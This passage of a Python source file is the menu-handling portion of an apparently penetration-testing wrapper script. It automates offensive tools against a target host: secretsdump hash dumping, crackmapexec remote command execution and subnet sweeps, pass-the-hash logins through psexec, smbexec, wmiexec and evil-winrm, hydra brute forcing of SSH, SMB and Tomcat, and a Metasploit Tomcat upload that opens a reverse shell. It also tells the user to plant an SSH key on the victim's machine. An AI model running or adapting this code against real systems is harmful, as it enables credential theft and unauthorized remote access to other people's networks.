      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1
      
      if CheckParams != 1:
         print ("[*] Enumerating, please wait...")     
         if PAS[:2] != "''":
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
         else:
            command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " --hashes " + NTM.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
      prompt()
         
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='53':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         BH1 = input("\n[+] Enter Neo4j username: ")
         BH2 = input("[+] Enter Neo4j password: ")
         if BH1 != "" and BH2 != "":
            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") +"' -s -dry")
         else:
            print("\n[-] Username or password cannot be null...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.   if PAS[:2] != "''":
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='54':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("Enumerating, please wait...\n")
         if PAS[:2] != "''":
            command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > SECRETS.tmp")
         else:
            command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > SECRETS.tmp")

         command("sed -i '/:::/!d' SECRETS.tmp")				# TIDY UP FILE READY FOR READING
         count = len(open('SECRETS.tmp').readlines())

         cleanusers()         
         for x in range(0, count):
            data = linecache.getline("SECRETS.tmp", x + 1)
            data = data.replace(":::","")				# DELETE THIS LINE?
            temp = DOM.rstrip(" ") + "\\"				# TIDY UP THE DATA
            data = data.replace(temp,"")
            temp = DOM.rstrip(" ") + ".LOCAL\\"
            data = data.replace(temp,"")

            try:
               get1,get2,get3,get4 = data.split(":") 
            except ValueError:
               if get1 == "":
                  get1 == "Error..."
               if get2 == "":
                  get2 == "Error..."
               if get3 == "":
                  get3 == "Error..."
               if get4 == "":
                  get4 == "Error..."

            get1 = get1.rstrip("\n")
            get2 = get1.rstrip("\n")
            get3 = get1.rstrip("\n")
            get4 = get4.rstrip("\n")

            print(colored("[+] Found User " + get1,colour2, attrs=['bold']))
            USER[x] = get1[:COL3]
            USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP ANY REMAINING DOMAIN NAME
            PASS[x] = get4[:COL4]         
            
            if len(USER[x]) < COL1: USER[x] = padding(USER[x], COL3) 			# USER
            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4) 			# PASSWORD

         for z in range(0, MAXX):
            if USER[z].rstrip(" ") == USR.rstrip(" "):
               NTM = PASS[z]			# RESET DISPLAY HASH
               if len(NTM) < COL1: NTM = padding(NTM, COL1)

         os.remove("SECRETS.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='55':
      CheckParams = 0

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         if PAS[:2] != "''":
            print("[*] Enumerating, please wait...")
            print("[+] Other exploitable machines on the same subnet...\n")
            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
         
            print("\n[+] Trying specified windows command...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'whoami /all'")

            print("\n[+] Trying to enumerate users and shares...\n")  
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
         
            print("\n[+] Trying a few other command while I am here...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'net user Administrator /domain'")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -X '$PSVersionTable'")         
         else:
            print("[*] Enumerating, please wait...")          
            print("[+] Other exploitable machines on the same subnet...\n")
            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
         
            print("\n[+] Trying specified windows command...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'whoami /all'")

            print("\n[+] Trying to enumerate users and shares...\n")  
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --users")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --shares")
         
            print("\n[+] Trying a few other command while I am here...\n")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'net user Administrator /domain'")
            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -X '$PSVersionTable'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='56':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
         command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -service-name LUALL.exe") 
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - domain/username:password@<targetName or address
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='57':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
         command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='58':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("\n[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
         command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()     

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - gpp AES256 Cracker
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='59':
      AES256 = input("[*] Please enter the AES-256 Encryption: ")
      if AES256 != "":
         command("gpp-decrypt " + AES256)
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='60':
      print("[*] Generating Keys...\n")
      command("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
      command("tput setaf 2; tput bold")
      command("cat id_rsa.pub")
      command("tput sgr0; tput dim")
      print("\n[+] Insert the above into authorized_keys on the victim's machine...")
      if USR[:2] == "''":
         print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
      else:
         print("[+] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='61':
      CheckParams = 0
   
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1   
   
      if CheckParams != 1:
         if WEB[:1] != "":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[+] User list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[+] User list generated via ip address...")

         if os.path.exists("/usr/share/ncrack/minimal.usr"):
            command("cat /usr/share/ncrack/minimal.usr >> usernames.txt 2>&1")
            command("sed -i '/#/d' usernames.txt 2>&1")
            command("sed -i '/Email addresses found/d' usernames.txt 2>&1")
            command("sed -i '/---------------------/d' usernames.txt 2>&1")
            print("[+] Adding NCrack minimal.usr list as well...")

         for x in range (0,MAXX):
            USER[x] = linecache.getline("usernames.txt", x+1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
      prompt()
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='62':
      CheckParams = 0  
   
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1   
      
      if CheckParams != 1:
         if WEB[:1] != "":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[+] Password list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write passwords.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[+] Password list generated via ip address...")

         if os.path.exists("/usr/share/ncrack/minimal.usr"):
            command("cat /usr/share/ncrack/minimal.usr >> passwords.txt 2>&1")
            command("sed -i '/#/d' passwords.txt 2>&1")
            command("sed -i '/Email addresses found/d' passwords.txt 2>&1")
            command("sed -i '/---------------------/d' passwords.txt 2>&1")
            print("[+] Adding NCrack minimal.usr list as well...")
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - NANO usernames.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='63':
      command("nano usernames.txt")
      for x in range (0, MAXX):
         USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
      prompt()
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - NANO passwords.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='64':
      command("nano passwords.txt")
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - NANO /etc/hosts
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      command("nano /etc/hosts")
      prompt()
            
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - NANO /etc/resolv.conf
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='66':
      command("nano /etc/resolv.conf")            
      prompt() 
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - HYDRA BRUTE FORCE SSH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      CheckParams = 0   

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         if os.path.getsize("usernames.txt") == 0:
            print("[-] Username file is empty...")
            if USER[:1] != "'":
               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
            else:
               print("[*] Adding user 'administrator'...")
               command("echo 'administrator' >> usernames.txt")
         
         if os.path.getsize("passwords.txt") == 0:             
            print("\n[-] Password file is empty...")
            if PASS[:1] != "'":
               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[*] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         command("hydra -P passwords.txt -L usernames.txt ssh://" + TIP.rstrip(" "))
         
         for x in range (0,MAXX):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - HYDRA SMB BRUTEFORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      CheckParams = 0   

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         if os.path.getsize("usernames.txt") == 0:
            print("[-] Username file is empty...")
            if USER[:1] != "'":
               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
            else:
               print("[*] Adding user 'administrator'...")
               command("echo 'administrator' >> usernames.txt")
         
         if os.path.getsize("passwords.txt") == 0:             
            print("\n[-] Password file is empty...")
            if PASS[:1] != "'":
               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[*] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
         
         for x in range (0,MAXX):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            
      prompt() 

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      if WEB[:5] == "EMPTY":
         print("[-] Target web address not specified...")
      else:
         print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
         
         os.remove("usernames.txt")
         os.remove("passwords.txt")
         
         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
            for line in userpasslist:
               one, two = line.strip().split(':')
               command("echo " + one + " >> usernames.tmp")
               command("echo " + two + " >> passwords.tmp")
               
            command("cat usernames.tmp | sort -u > usernames.txt")
            command("cat passwords.tmp | sort -u > passwords.txt")
            command("rm *.tmp")
            
         if "http://" in WEB.lower():
            target = WEB.replace("http://","")
            command("hydra -L usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
         
         if "https://" in WEB.lower():
            target = target.replace("https://","")
            command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
                          
         for x in range (0,MAXX):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            
      prompt()
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='70':
      command("touch meterpreter.rc")
      command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
      command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
      if "8080" in POR:
         command("echo 'set RPORT 8080' >> meterpreter.rc")
      else:
         PORT = input("Please enter tomcat port number: ")
         command("echo 'set RPORT " + PORT + "' >> meterpreter.rc")
      command("echo 'set HttpPassword " + PAS.rstrip(" ") + "' >> meterpreter.rc")
      command("echo 'set HttpUsername " + USR.rstrip(" ") + "' >> meterpreter.rc")
      command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
      command("hostname -I >> temp.tmp")
      target = linecache.getline("temp.tmp",1)
      os.remove("temp.tmp")
      one, two, three, four = target.split(" ")
      target = two.rstrip(" ")
      command("echo 'set lhost " + target + "' >> meterpreter.rc")
      command("echo 'run' >> meterpreter.rc")
      command("msfconsole -r meterpreter.rc")
      prompt() 
      os.remove("meterpreter.rc")      
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Exit (1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='71':
      exit(1)  
      
 #------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='72':
      exit(1)          
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='73':
      exit(1)    
      
 #------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='74':
      exit(1)    
 
 #------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - GOBUSTER 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='75':
      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
      else:
         if WEB[:5] != "EMPTY":
            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
         else:
            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
      prompt()
      
 #------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - FTP IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='76':
      if TIP[:5] != "EMPTY":
         command("ftp " + TIP.rstrip(" "))
      prompt() 
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - TFPS IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='77':
      if TIP[:5] != "EMPTY":
         command("tftp " + TIP.rstrip(" "))
      prompt() 
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - SFTP IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='78':
      if TIP[:5] != "EMPTY":
         command("sftp " + TIP.rstrip(" "))
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - PFTP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='79':
      if TIP[:5] != "EMPTY":
         command("pftp " + TIP.rstrip(" "))
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected -  sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='80':
      if TIP[:5] != "EMPTY":
         command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - ssh -l USER IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='81':
      if TIP[:5] != "EMPTY":
         command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - ssh -i id USER@IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='82':
      if TIP[:5] != "EMPTY":
         command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='83':
      if TIP[:5] != "EMPTY":
         command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
      prompt()


# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - telnet -l USER IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='84':
      if TIP[:5] != "EMPTY":
         command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - nc IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='85':
      if TIP[:5] != "EMPTY":
         command("nc " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Windows remote login on POR 5985.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='86':
      CheckParams = 0      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP has not been specified...")
         CheckParams = 1
         
      if PAS.rstrip(" ") == "''":
         print("[-] Password has not been specified...")
         CheckParams = 1   
   
      if CheckParams == 1:
         if (NTM[:5] != "EMPTY") and (TIP[:5] != "EMPTY"):      
            print("[*] Using the HASH value as a login credential...")
            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "'")
         else:
            if (NTM[:5] == "EMPTY") or (NTM[:1] == "."):
               print("[-] Hash value has not been specified...")
                    
      if CheckParams == 0:
         command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='87':
      if TIP[:5] != "EMPTY":
         command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Xfreeredp
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '88':
      if TIP[:5] != "EMPTY":
         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
      prompt()     
                 
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Save current data to config.txt and exit the program.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '89':
      if os.path.exists("config.txt"):
         os.remove("config.txt")				# DELETE OLD CONFIG FILE
      command("touch config.txt")				# CREATE NEW CONFIG FILE
      command("echo " + DNS + " >> config.txt")
      command("echo " + TIP + " >> config.txt")
      command("echo " + POR + " >> config.txt")  
      command("echo " + WEB + " >> config.txt")  

      null = "\\'\\'"
      if USR.rstrip(" ") == "''":
         command("echo " + null + " >> config.txt")
      else:
         command("echo '" + USR  + "' >> config.txt")           
      if PAS.rstrip(" ") == "''":
         command("echo " + null + " >> config.txt")
      else:
         command("echo '" + PAS  + "' >> config.txt")     
 
      command("echo " + NTM + " >> config.txt")
      command("echo " + DOM + " >> config.txt")  
      command("echo " + SID + " >> config.txt")
      command("echo " + TSH + " >> config.txt")  
      command("echo " + LTM + " >> config.txt")  
      command("echo " + DIR + " >> config.txt")   
      
      os.remove("usernames.txt")			# NOW TIDY UP
      if os.path.exists("id_rsa.pub"):
         os.remove("id_rsa.pub")
         os.remove("id_rsa")
      if os.path.exists("usernames2.txt"):
         os.remove("usernames2.txt")      
      os.remove("passwords.txt")
      if DOMC == 1:
         command("sed -i '$d' /etc/hosts")
      if len(os.listdir("WORKAREA")) == 0:
         os.rmdir("WORKAREA")
      exit(1)

# Eof...	
